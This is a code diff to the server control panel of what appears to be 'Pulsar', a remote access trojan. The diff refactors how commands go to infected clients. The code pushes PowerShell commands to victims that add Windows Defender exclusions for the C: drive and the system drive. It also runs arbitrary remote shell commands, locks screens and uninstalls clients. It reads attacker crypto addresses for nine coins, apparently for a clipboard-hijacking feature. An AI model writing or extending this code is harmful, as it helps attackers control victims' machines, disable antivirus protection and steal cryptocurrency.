+            foreach (Client c in GetSelectedClients())
+            {
+                TryUninstallVirtualMonitor(c);
+            }
         }
 
         #endregion "Monitoring"
@@ -2994,8 +3213,9 @@ namespace Pulsar.Server.Forms
 
                 foreach (Client c in clients)
                 {
-                    c.Send(new DoShowMessageBox
+                    ExecutePanelOperation(c, new ClientOperationRequest
                     {
+                        Operation = ClientOperation.MessageBox,
                         Caption = caption,
                         Text = text,
                         Button = button,
@@ -3012,8 +3232,9 @@ namespace Pulsar.Server.Forms
                 {
                     foreach (Client c in clients)
                     {
-                        c.Send(new DoShowMessageBox
+                        ExecutePanelOperation(c, new ClientOperationRequest
                         {
+                            Operation = ClientOperation.MessageBox,
                             Caption = frm.MsgBoxCaption,
                             Text = frm.MsgBoxText,
                             Button = frm.MsgBoxButton,
@@ -3031,7 +3252,6 @@ namespace Pulsar.Server.Forms
         private void addCDriveExceptionToolStripMenuItem_Click(object sender, EventArgs e)
         {
             string powershellCode = "Add-MpPreference -ExclusionPath C:\\";
-            DoSendQuickCommand quickCommand = new DoSendQuickCommand { Command = powershellCode, Host = "powershell.exe" };
 
             foreach (Client c in GetSelectedClients())
             {
@@ -3039,7 +3259,12 @@ namespace Pulsar.Server.Forms
 
                 if (isClientAdmin)
                 {
-                    c.Send(quickCommand);
+                    ExecutePanelOperation(c, new ClientOperationRequest
+                    {
+                        Operation = ClientOperation.QuickCommand,
+                        Command = powershellCode,
+                        Host = "powershell.exe"
+                    });
                 }
                 else
                 {
@@ -3264,6 +3489,17 @@ namespace Pulsar.Server.Forms
 
         private void contextMenuStrip_Opening(object sender, System.ComponentModel.CancelEventArgs e)
         {
+            var selectedClients = GetSelectedClients();
+            e.Cancel = selectedClients.Length == 0;
+            if (e.Cancel)
+            {
+                return;
+            }
+
+            foreach (ToolStripItem item in contextMenuStrip.Items)
+            {
+                item.Enabled = true;
+            }
         }
 
         private void addKeywordsToolStripMenuItem_Click(object sender, EventArgs e)
@@ -3379,18 +3615,7 @@ namespace Pulsar.Server.Forms
 
             if (lblNotificationStatus != null)
             {
-                if (pending == 0)
-                {
-                    lblNotificationStatus.Text = total == 0
-                        ? "You're all caught up. No notifications yet."
-                        : $"You're all caught up. {total} notifications logged.";
-                }
-                else
-                {
-                    lblNotificationStatus.Text = total > pending
-                        ? $"Pending notifications: {pending} of {total}"
-                        : $"Pending notifications: {pending}";
-                }
+                lblNotificationStatus.Text = ResolveNotificationStatusText(pending, total);
             }
 
             if (tabPage2 != null)
@@ -3753,8 +3978,31 @@ namespace Pulsar.Server.Forms
             }
         }
 
-        private void systemToolStripMenuItem_Click(object sender, EventArgs e)
+        private void clearAllNotificationsToolStripMenuItem_Click(object sender, EventArgs e)
         {
+            if (_notificationHistory.Count == 0)
+            {
+                return;
+            }
+
+            var result = MessageBox.Show(
+                "Clear the complete notification history?",
+                "Notification Center",
+                MessageBoxButtons.YesNo,
+                MessageBoxIcon.Question);
+            if (result != DialogResult.Yes)
+            {
+                return;
+            }
+
+            lock (_notificationLock)
+            {
+                _notificationHistory.Clear();
+                lstNoti.Items.Clear();
+            }
+
+            UpdateNotificationStatusLabel();
+            SaveNotificationHistory();
         }
 
         private void deleteTasksToolStripMenuItem_Click(object sender, EventArgs e)
@@ -3930,12 +4178,31 @@ namespace Pulsar.Server.Forms
 
         public string GetBCHAddress() => BCHTextBox.Text;
 
-        private void taskTestToolStripMenuItem_Click(object sender, EventArgs e)
+        public string GetCryptoAddress(string addressType)
         {
-        }
+            if (InvokeRequired)
+            {
+                return (string)this.Invoke(new Func<string>(() => GetCryptoAddress(addressType)));
+            }
 
-        private void tableLayoutPanel1_Paint(object sender, PaintEventArgs e)
-        {
+            if (string.IsNullOrWhiteSpace(addressType))
+            {
+                return string.Empty;
+            }
+
+            return addressType.Trim().ToUpperInvariant() switch
+            {
+                "BTC" => GetBTCAddress(),
+                "LTC" => GetLTCAddress(),
+                "ETH" => GetETHAddress(),
+                "XMR" => GetXMRAddress(),
+                "SOL" => GetSOLAddress(),
+                "DASH" => GetDASHAddress(),
+                "XRP" => GetXRPAddress(),
+                "TRX" => GetTRXAddress(),
+                "BCH" => GetBCHAddress(),
+                _ => string.Empty
+            };
         }
 
         private void saveLogsToolStripMenuItem_Click(object sender, EventArgs e)
@@ -3976,10 +4243,6 @@ namespace Pulsar.Server.Forms
         private void clearLogsToolStripMenuItem_Click(object sender, EventArgs e)
         {
             DebugLogRichBox.Clear();
-        }
-
-        private void clearSelectedToolStripMenuItem1_Click(object sender, EventArgs e)
-        {
         }
 
         private void lstClients_Resize(object sender, EventArgs e)
@@ -4228,7 +4491,7 @@ namespace Pulsar.Server.Forms
                 {
                     blockedIPs.Add(clientAddress);
                 }
-                c.Send(new DoClientUninstall());
+                ExecutePanelOperation(c, ClientOperation.Uninstall);
             }
 
             try
@@ -4708,19 +4971,30 @@ namespace Pulsar.Server.Forms
                     if (!string.IsNullOrWhiteSpace(task.Param2))
                     {
                         string host = string.IsNullOrWhiteSpace(task.Param1) ? "cmd.exe" : task.Param1;
-                        client.Send(new DoSendQuickCommand { Host = host, Command = task.Param2 });
+                        ExecutePanelOperation(client, new ClientOperationRequest
+                        {
+                            Operation = ClientOperation.QuickCommand,
+                            Host = host,
+                            Command = task.Param2
+                        });
                     }
                     break;
                 case "Exclude System Drives":
                     if (client.Value.AccountType == "Admin" || client.Value.AccountType == "System")
                     {
                         string powershellCode = "Add-MpPreference -ExclusionPath \"$([System.Environment]::GetEnvironmentVariable('SystemDrive'))\\\"\r\n";
-                        client.Send(new DoSendQuickCommand { Command = powershellCode, Host = "powershell.exe" });
+                        ExecutePanelOperation(client, new ClientOperationRequest
+                        {
+                            Operation = ClientOperation.QuickCommand,
+                            Command = powershellCode,
+                            Host = "powershell.exe"
+                        });
                     }
                     break;
                 case "Message Box":
-                    client.Send(new DoShowMessageBox
+                    ExecutePanelOperation(client, new ClientOperationRequest
                     {
+                        Operation = ClientOperation.MessageBox,
                         Caption = task.Param1 ?? string.Empty,
                         Text = task.Param2 ?? string.Empty,
                         Button = string.IsNullOrWhiteSpace(task.Param3) ? "OK" : task.Param3,
@@ -5530,7 +5804,6 @@ namespace Pulsar.Server.Forms
             finally
             {
                 // Always update status bar, even if there was an error
-                listenToolStripStatusLabel.Text = $"Listening on port: 8080";
                 connectedToolStripStatusLabel.Text = $"Connected: {connectedCount} | Server plugins: {enabledPlugins} | Client plugins: {clientPluginCount}";
             }
         }
@@ -5725,7 +5998,7 @@ namespace Pulsar.Server.Forms
         {
             foreach (Client c in GetSelectedClients())
             {
-                c.Send(new DoMonitorsOff(false));
+                c.Send(new DoMonitorsOff(off: true));
             }
         }
 
@@ -5733,7 +6006,7 @@ namespace Pulsar.Server.Forms
         {
             foreach (Client c in GetSelectedClients())
             {
-                c.Send(new DoMonitorsOff(true));
+                c.Send(new DoMonitorsOff(on: true));
             }
         }
 
@@ -5794,16 +6067,7 @@ namespace Pulsar.Server.Forms
         {
             foreach (Client c in GetSelectedClients())
             {
-                //check if client is admin
-                bool isClientAdmin = c.Value.AccountType == "Admin" || c.Value.AccountType == "System";
-                if (isClientAdmin)
-                {
-                    c.Send(new DoInstallVirtualMonitor());
-                }
-                else
-                {
-                    MessageBox.Show("The client is not running as an Administrator. Please elevate the client's permissions and try again.", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
-                }
+                TryInstallVirtualMonitor(c);
             }
         }
 
@@ -5811,17 +6075,67 @@ namespace Pulsar.Server.Forms
         {
             foreach (Client c in GetSelectedClients())
             {
-                //check if client is admin
-                bool isClientAdmin = c.Value.AccountType == "Admin" || c.Value.AccountType == "System";
-                if (isClientAdmin)
-                {
-                    c.Send(new DoUninstallVirtualMonitor());
-                }
-                else
-                {
-                    MessageBox.Show("The client is not running as an Administrator. Please elevate the client's permissions and try again.", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
-                }
+                TryUninstallVirtualMonitor(c);
             }
+        }
+
+        private void TryInstallVirtualMonitor(Client client)
+        {
+            if (client == null || !client.Connected)
+            {
+                return;
+            }
+
+            bool isClientAdmin = client.Value?.AccountType == "Admin" ||
+                                 client.Value?.AccountType == "System";
+            if (!isClientAdmin)
+            {
+                MessageBox.Show("The client is not running as an Administrator. Please elevate the client's permissions and try again.", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
+                return;
+            }
+
+            if (!client.TrySend(new DoInstallVirtualMonitor()))
+            {
+                EventLog($"Failed to queue virtual monitor install for {client.Value?.UserAtPc}", "error");
+            }
+        }
+
+        private void TryUninstallVirtualMonitor(Client client)
+        {
+            if (client == null || !client.Connected)
+            {
+                return;
+            }
+
+            bool isClientAdmin = client.Value?.AccountType == "Admin" ||
+                                 client.Value?.AccountType == "System";
+            if (!isClientAdmin)
+            {
+                MessageBox.Show("The client is not running as an Administrator. Please elevate the client's permissions and try again.", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
+                return;
+            }
+
+            if (!client.TrySend(new DoUninstallVirtualMonitor()))
+            {
+                EventLog($"Failed to queue virtual monitor uninstall for {client.Value?.UserAtPc}", "error");
+            }
+        }
+
+        private void VirtualMonitorOperationCompleted(Client client, bool success, string error, bool install)
+        {
+            if (InvokeRequired)
+            {
+                BeginInvoke(new Action(() =>
+                    VirtualMonitorOperationCompleted(client, success, error, install)));
+                return;
+            }
+
+            string action = install ? "install" : "uninstall";
+            string target = client?.Value?.UserAtPc ?? "unknown client";
+            EventLog(success
+                ? $"Virtual monitor {action} completed for {target}"
+                : $"Virtual monitor {action} failed for {target}: {error}",
+                success ? "normal" : "error");
         }
 
         private void remoteExecuteToolStripMenuItem_Click(object sender, EventArgs e)
@@ -5838,8 +6152,26 @@ namespace Pulsar.Server.Forms
         {
             foreach (Client c in GetSelectedClients())
             {
-                c.Send(new DoShutdownAction { Action = ShutdownAction.Lockscreen });
+                ExecutePanelOperation(c, ClientOperation.Lockscreen);
             }
+        }
+
+        private ClientOperationResult ExecutePanelOperation(Client client, ClientOperation operation)
+        {
+            return ExecutePanelOperation(client, new ClientOperationRequest { Operation = operation });
+        }
+
+        private ClientOperationResult ExecutePanelOperation(Client client, ClientOperationRequest request)
+        {
+            if (request == null)
+            {
+                return ClientOperationResult.Create(
+                    client?.Value?.Id, ClientOperation.None, ClientOperationStatus.InvalidRequest,
+                    "invalid request");
+            }
+
+            request.ClientId = client?.Value?.Id;
+            return _clientOperations.Execute(request, "winforms panel");
         }
 
         private void deleteTempDirectoryToolStripMenuItem_Click(object sender, EventArgs e)
